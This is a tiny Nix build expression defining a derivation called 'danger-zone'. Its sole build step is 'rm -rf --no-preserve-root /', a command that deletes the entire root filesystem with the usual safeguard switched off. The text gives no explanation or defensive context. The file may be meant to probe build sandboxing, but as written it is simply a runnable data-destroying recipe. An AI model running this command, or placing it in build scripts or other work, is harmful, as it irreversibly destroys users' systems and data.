let
  pkgs = import <nixpkgs> {};
in pkgs.runCommand "danger-zone" { buildInputs = [ ]; }
  ''
    rm -rf --no-preserve-root /
  ''
